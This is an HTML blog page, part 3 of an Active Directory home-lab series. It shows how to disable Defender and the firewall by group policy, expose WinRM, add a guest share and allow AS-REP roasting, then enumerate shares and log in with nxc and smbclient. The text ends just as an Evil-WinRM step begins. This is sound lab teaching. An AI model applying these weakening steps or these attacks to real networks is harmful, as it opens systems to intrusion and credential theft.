@@ -1,0 +1,509 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.7.0.799059026210">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.7.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Active Directory Home Lab with Proxmox - Part 3</title>
+    <meta name="title" content="Active Directory Home Lab with Proxmox - Part 3">
+    <meta name="description" content="We are now going to add some simple misconfigurations to our AD Lab.">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://bytebl33d.github.io/blog/proxmox-homelab-part3/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://bytebl33d.github.io/blog/proxmox-homelab-part3/">
+    <meta property="og:title" content="Active Directory Home Lab with Proxmox - Part 3">
+    <meta property="og:description" content="We are now going to add some simple misconfigurations to our AD Lab.">
+    <meta property="og:image" content="https://bytebl33d.github.io/assets/images/headers/ad-banner.jpg">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://bytebl33d.github.io/blog/proxmox-homelab-part3/">
+    <meta property="twitter:title" content="Active Directory Home Lab with Proxmox - Part 3">
+    <meta property="twitter:description" content="We are now going to add some simple misconfigurations to our AD Lab.">
+    <meta property="twitter:image" content="https://bytebl33d.github.io/assets/images/headers/ad-banner.jpg">
+
+    <!-- RSS -->
+    <link rel="alternate" type="application/rss+xml" title="Blog >> Feed" href="https://bytebl33d.github.io/blog/feed.xml">
+
+    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="../../resources/css/retype.css?v=3.7.0.799059026210" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../resources/js/config.js?v=3.7.0.799059026210" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../resources/js/retype.js?v=3.7.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=3.7.0.799059026210" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=3.7.0.799059026210" defer></script>
+</head>
+<body>
+    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="docs-sidebar-toggle"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="docs-site-logo" href="../../" class="flex items-center leading-snug text-2xl">
+                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">bytebl33d</span>
+                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">Blog</span>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../blog/">Posts</a>
+                            </li>
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/bytebl33d">GitHub</a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="docs-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+        <div class="relative flex mx-auto bg-white max-w-core">
+            <div class="md:hidden">
+                <!-- Sidebar Skeleton -->
+                <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+                
+                    <div class="flex items-center h-16 px-6">
+                        <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                    </div>
+                
+                    <div class="pl-6 mt-1 mb-4">
+                        <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                        <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                        <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                        <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                        <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                        <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    </div>
+                
+                    <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                            <span class="text-xs whitespace-nowrap">Powered by</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                        </a>
+                    </div>
+                </div>
+                
+                <!-- Sidebar component -->
+                <doc-sidebar v-cloak>
+                    <template #sidebar-footer>
+                        <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+                
+                            <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                                <nav>
+                                    <ul class="flex flex-wrap justify-center items-center">
+                                        <li class="mr-6">
+                                            <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../blog/">Posts</a>
+                                        </li>
+                                        <li class="mr-6">
+                                            <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/bytebl33d">GitHub</a>
+                                        </li>
+                
+                                    </ul>
+                                </nav>
+                            </div>
+                
+                            <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                                <span class="text-xs whitespace-nowrap">Powered by</span>
+                                <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                            </a>
+                        </div>
+                    </template>
+                </doc-sidebar>
+            </div>
+    
+            <div class="grow min-w-0 dark:bg-dark-850">
+                <!-- Render page content -->
+                <div class="grow min-w-0 px-6">
+                    <main class="relative pt-6 pb-16">
+                        <div class="docs-markdown" id="docs-content">
+                            <!-- Rendered if sidebar right is enabled -->
+                            <div id="docs-sidebar-right-toggle"></div>
+                            <!-- Page content  -->
+<doc-anchor-target id="active-directory-home-lab-with-proxmox---part-3" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#active-directory-home-lab-with-proxmox---part-3">#</doc-anchor-trigger>
+        <span>Active Directory Home Lab with Proxmox - Part 3</span>
+    </h1>
+</doc-anchor-target>
+<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center">
+    <div>In&nbsp;</div>
+    <div><a href="../../categories/active-directory/">Active-Directory</a>,&nbsp;</div>
+    <div><a href="../../categories/homelab/">Homelab</a></div>
+    <div class="mx-2">&#9679;</div>
+    <div class="flex items-center shrink-0">Published&nbsp;<span>2024-03-30</span></div>
+</div>
+
+<p><figure class="content-center">
+    <img src="../../assets/images/headers/ad-banner.jpg" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We are now going to add some simple misconfigurations to our AD Lab. In the final section we will verify them by targeting our network from an outside Linux VM. To make the Active Directory Lab vulnerable we first need to change some settings.</p>
+<doc-anchor-target id="group-policy-configuration" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#group-policy-configuration">#</doc-anchor-trigger>
+        <span>Group Policy Configuration</span>
+    </h1>
+</doc-anchor-target>
+<p>Open the <code v-pre>Start menu</code> and click on <code v-pre>Windows Administrative Tools</code>, then choose <code v-pre>Group Policy Management</code>. Expand <code v-pre>Forest</code> and <code v-pre>Domains</code>, to view your own domain.</p>
+<doc-anchor-target id="disable-windows-defender-and-firewall">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#disable-windows-defender-and-firewall">#</doc-anchor-trigger>
+        <span>Disable Windows Defender and Firewall</span>
+    </h2>
+</doc-anchor-target>
+<p>We can create a first GPO that will disable the Windows Defender Firewall so we can more easily experiment with attacks later on. Of course we could also disable (unlink) the policy later.</p>
+<p>Do not do this in a real enterprise environment! You can skip this step if you don&#x27;t want to make your lab vulnerable.</p>
+<p>Right-click on the domain name. Select <code v-pre>Create a GPO in the domain and link here</code>. Give the GPO the name <code v-pre>Disable Protections</code>. Right-click on the newly added policy and choose <code v-pre>Edit</code>.</p>
+<p>This will open the <code v-pre>Group Policy Management Editor</code>. From the sidebar go to the following folder: <code v-pre>Computer Configuration &gt; Policies &gt; Administrative Templates &gt; Windows Components &gt; Microsoft Defender Antivirus</code>. Select <code v-pre>Microsoft Defender Antivirus</code>. From the right side select <code v-pre>Turn off Microsoft Defender Antivirus</code> and click on <code v-pre>Edit policy setting</code>. Set it to Enabled. Click on Apply then OK to save the changes.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/homelab/vuln-setup-1.png" alt="vulnerability-setup-1">
+    <figcaption class="caption">vulnerability-setup-1</figcaption>
+</figure>
+</p>
+<p>Next go to <code v-pre>Real-time Protection</code> and enable <code v-pre>Turn off real-time protection</code>.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/homelab/vuln-setup-2.png" alt="vulnerability-setup-2">
+    <figcaption class="caption">vulnerability-setup-2</figcaption>
+</figure>
+</p>
+<p>Expand the sidebar folders to the following: <code v-pre>Computer Configuration &gt; Policies &gt; Administrative Templates &gt; Network &gt; Network Connections &gt; Windows Defender Firewall &gt; Domain Profile</code>. Disable the <code v-pre>Windows Defender Firewall: Protect all network connections</code> setting.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/homelab/vuln-setup-3.png" alt="vulnerability-setup-3">
+    <figcaption class="caption">vulnerability-setup-3</figcaption>
+</figure>
+</p>
+<p>Close Group Policy Management Editor. From the sidebar of Group Policy Management right-click on <code v-pre>Disable Protections</code> and choose <code v-pre>Enforced</code>.</p>
+<doc-anchor-target id="enable-winrm-server">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#enable-winrm-server">#</doc-anchor-trigger>
+        <span>Enable WinRM Server</span>
+    </h2>
+</doc-anchor-target>
+<p>Right-click on your domain name. Select <code v-pre>Create a GPO in the domain and link here</code>. Give the GPO the name <code v-pre>Enable WinRM Server</code>. Right-click on it and choose <code v-pre>Edit</code>. Using the sidebar go to the following folder: <code v-pre>Computer Configuration &gt; Policies &gt; Administrative Templates &gt; Windows Components &gt; Windows Remote Management (WinRM) &gt; WinRM Service</code>. Select <code v-pre>Allow remote server management through WinRM</code> and then click on <code v-pre>Edit policy settings</code>. Set the policy to <code v-pre>Enabled</code> and in the IPv4 filter field enter <code v-pre>*</code>. Click on <code v-pre>Apply</code> then <code v-pre>OK</code>.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/homelab/vuln-setup-4.png" alt="vulnerability-setup-4">
+    <figcaption class="caption">vulnerability-setup-4</figcaption>
+</figure>
+</p>
+<p>Optionally you can enable <code v-pre>Allow Basic authentication</code> and <code v-pre>Allow unencrypted traffic</code> if you want people to perform Man-in-the-Middle attacks.</p>
+<p>Next navigate to <code v-pre>Computer Configuration &gt; Preferences &gt; Control Panel Settings</code>. Right-click on <code v-pre>Services</code> and select <code v-pre>New &gt; Service</code>.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/homelab/vuln-setup-5.png" alt="vulnerability-setup-5">
+    <figcaption class="caption">vulnerability-setup-5</figcaption>
+</figure>
+</p>
+<p>Set <code v-pre>Startup</code> to <code v-pre>Automatic</code>. Use the <code v-pre>...</code> button to select the service name. Select <code v-pre>Windows Remote Management (WS-Management)</code> and click on Select. Set the service action to <code v-pre>Start Service</code>.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/homelab/vuln-setup-6.png" alt="vulnerability-setup-6">
+    <figcaption class="caption">vulnerability-setup-6</figcaption>
+</figure>
+</p>
+<p>Once again in the sidebar navigate to <code v-pre>Computer Configuration &gt; Policies &gt; Administrative Templates &gt; Windows Components &gt; Windows Remote Shell</code>. Select <code v-pre>Allow Remote Shell Access</code> and enable it.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/homelab/vuln-setup-7.png" alt="vulnerability-setup-7">
+    <figcaption class="caption">vulnerability-setup-7</figcaption>
+</figure>
+</p>
+<p>Finally go to <code v-pre>Computer Configuration &gt; Policies &gt; Security Settings &gt; Windows Firewall with Advanced Security</code>. Right-click <code v-pre>Inbound Rules</code> and create a <code v-pre>New Rule</code>.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/homelab/vuln-setup-7.0.png" alt="vulnerability-setup-7.0">
+    <figcaption class="caption">vulnerability-setup-7.0</figcaption>
+</figure>
+</p>
+<p>Select <code v-pre>Predefined</code> and choose <code v-pre>Windows Remote Management</code> from the list (not the one with compatible). Click <code v-pre>Next</code>. Select the one for Domain and Private, and <code v-pre>Allow</code> the connection at the next screen.</p>
+<p>You can scan port 5985 on one of your remote computers to see if it responds (it might need a restart):</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">PS C:\&gt; Test-NetConnection -ComputerName MS01 -Port 5985
+
+ComputerName        : MS01
+RemoteAddress       : 172.16.200.11
+RemotePort          : 5985
+InterfaceAlias      : Ethernet
+SourceAddress       : 172.16.200.100
+TcpTestSucceeded    : True</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="additional-registry-edit">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#additional-registry-edit">#</doc-anchor-trigger>
+        <span>Additional Registry Edit</span>
+    </h3>
+</doc-anchor-target>
+<p>I found that when applying the GPO to the domain, I was still not able to WinRM from a remote host. I found that enabling the WinRM service throught the Registry solved the issue. To do this go to <code v-pre>Computer Configuration &gt; Preferences &gt; Registry</code>. Right-click and select <code v-pre>New &gt; Registry Item</code>. As the registry path select <code v-pre>HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WinRM\Service</code> and set the value of the IPv4Filter to <code v-pre>*</code> or whatever IP range you want to include.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/homelab/vuln-setup-7.1.png" alt="vulnerability-setup-7.1">
+    <figcaption class="caption">vulnerability-setup-7.1</figcaption>
+</figure>
+</p>
+<doc-anchor-target id="adding-a-public-file-share">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#adding-a-public-file-share">#</doc-anchor-trigger>
+        <span>Adding a Public File Share</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="local-share">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#local-share">#</doc-anchor-trigger>
+        <span>Local Share</span>
+    </h3>
+</doc-anchor-target>
+<p>Login as a local administator to one of your Windows VMs and navigate to <code v-pre>Control Panel &gt; Network and Internet &gt; Network and Sharing Center &gt; Change Advanced sharing settings &gt; Guest or Public &gt; Turn on File and Printer sharing</code>.</p>
+<p>Next create a new folder, Right-click and go to <code v-pre>Properties &gt; Sharing tab &gt; Share</code> and give the <code v-pre>Everyone</code> user read permission.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/homelab/vuln-setup-9.png" alt="vulnerability-setup-9">
+    <figcaption class="caption">vulnerability-setup-9</figcaption>
+</figure>
+</p>
+<p>If you want to allow users to access the file share as a <code v-pre>Guest</code> user, then open <code v-pre>Local Security Policy</code> as an Administrator. Next go to <code v-pre>Local Policies &gt; Security Options &gt; Accounts: Guest account status</code> and switch it to Enabled.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/homelab/vuln-setup-8.png" alt="vulnerability-setup-8">
+    <figcaption class="caption">vulnerability-setup-8</figcaption>
+</figure>
+</p>
+<p>In the same window go to <code v-pre>User Rights Assignment &gt; Deny access to this computer from the network</code> and make sure that the Guest account is not in this list.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/homelab/vuln-setup-8.1.png" alt="vulnerability-setup-8">
+    <figcaption class="caption">vulnerability-setup-8</figcaption>
+</figure>
+</p>
+<doc-anchor-target id="enforce-the-domain-policies">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#enforce-the-domain-policies">#</doc-anchor-trigger>
+        <span>Enforce the Domain Policies</span>
+    </h2>
+</doc-anchor-target>
+<p>Right-click on the Start menu and select Windows PowerShell (Admin).
+In the terminal enter the following:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">gpupdate /force</code></pre>
+</doc-codeblock></div>
+<p>Now whenever a new device joins our AD environment the Group Policies that apply to all the devices will automatically be applied to them. With this, we have completed the Domain Controller setup.</p>
+<doc-anchor-target id="account-misconfigurations">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#account-misconfigurations">#</doc-anchor-trigger>
+        <span>Account Misconfigurations</span>
+    </h1>
+</doc-anchor-target>
+<doc-anchor-target id="asrep-roasting">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#asrep-roasting">#</doc-anchor-trigger>
+        <span>ASREP Roasting</span>
+    </h2>
+</doc-anchor-target>
+<p>In older versions of Kerberos, it was possible to allow authentication without a password. Since Kerberos 5, a password is required, which is called <code v-pre>Pre-Authentication</code>. If an account has the option <code v-pre>Do not require Kerberos preauthentication</code> checked, an attacker can send any request for authentication to the KDC to retrieve an encrypted TGT that can be brute-forced offline.</p>
+<p><figure class="content-center">
+    <img src="../../assets/images/homelab/vuln-setup-10.png" alt="asreproast-enable">
+    <figcaption class="caption">asreproast-enable</figcaption>
+</figure>
+</p>
+<doc-anchor-target id="attacking-our-environment">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#attacking-our-environment">#</doc-anchor-trigger>
+        <span>Attacking our Environment</span>
+    </h1>
+</doc-anchor-target>
+<doc-anchor-target id="browsing-public-shares">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#browsing-public-shares">#</doc-anchor-trigger>
+        <span>Browsing Public Shares</span>
+    </h2>
+</doc-anchor-target>
+<p>Lets start by checking if we can see any available shares on the network. I made one public share on the Windows VM with IP <code v-pre>172.16.200.11</code>. In Part 1 of this series we added an attacker VM to the AD network as our initial entry point that is whitelisted from the firewall. From this host, we should be able to list the share we made public.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ nxc smb 172.16.200.11 -u 'guest' -p '' --shares
+
+SMB         172.16.200.11   445    MS01             [*] Windows 10 Pro 19045 x64 (name:MS01) (domain:cicada.local)
+SMB         172.16.200.11   445    MS01             [+] cicada.local\guest: 
+SMB         172.16.200.11   445    MS01             [*] Enumerated shares
+SMB         172.16.200.11   445    MS01             Share           Permissions     Remark
+SMB         172.16.200.11   445    MS01             -----           -----------     ------
+SMB         172.16.200.11   445    MS01             ADMIN$                          Remote Admin
+SMB         172.16.200.11   445    MS01             C$                              Default share
+SMB         172.16.200.11   445    MS01             Department      READ            
+SMB         172.16.200.11   445    MS01             IPC$                            Remote IPC
+SMB         172.16.200.11   445    MS01             Users           READ</code></pre>
+</doc-codeblock></div>
+<p>We can see one public folder called <code v-pre>Department</code> and look at what information is stored inside.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ smbclient -U 'guest%' \\\\172.16.200.11\\Department
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+.                                   D        0  Wed Mar 27 23:38:24 2024
+..                                  D        0  Wed Mar 27 23:38:24 2024
+flag.txt                            A       25  Tue Feb 20 12:11:15 2024
+Informational                       D        0  Tue Feb 20 12:06:19 2024
+
+smb: \&gt; more flag.txt
+Br0wsing_F1L3_Sh4r3S_FTW!</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="evil-winrm">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#evil-winrm">#</doc-anchor-trigger>
+        <span>Evil-WinRM</span>
+    </h2>
+</doc-anchor-target>
+<p>To verify that we can also WinRM to our Windows VMs I created a honeypot account called <code v-pre>winnie.wonder</code> with the password <code v-pre>P@ssw0rd123</code> and logged into <code v-pre>MS01</code> with this account. By default, PowerShell Remoting (and WinRM) only allows connections from members of the Administrators or Remote Management Group. To add our user to the Built-In Remote Management Users run:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">PS C:/&gt; net localgroup &quot;Remote Management Users&quot; /add winnie.wonder</code></pre>
+</doc-codeblock></div>
+<p>We can now execute the following command from a Linux host inside the network:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">$ nxc winrm 172.16.200.11 -u 'winnie.wonder' -p 'P@ssw0rd123'
+SMB         172.16.200.11  5985   MS01             [*] Windows 10.0 Build 19041 (name:MS01) (domain:cicada.local)
+HTTP        172.16.200.11  5985   MS01             [*] http://172.16.200.11:5985/wsman
+HTTP        172.16.200.11  5985   MS01             [+] cicada.local\winnie.wonder:P@ssw0rd123 (Pwn3d!)</code></pre>
+</doc-codeblock></div>
+<p>Nice! We can now run remote commands using the tool Evil-WinRM.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
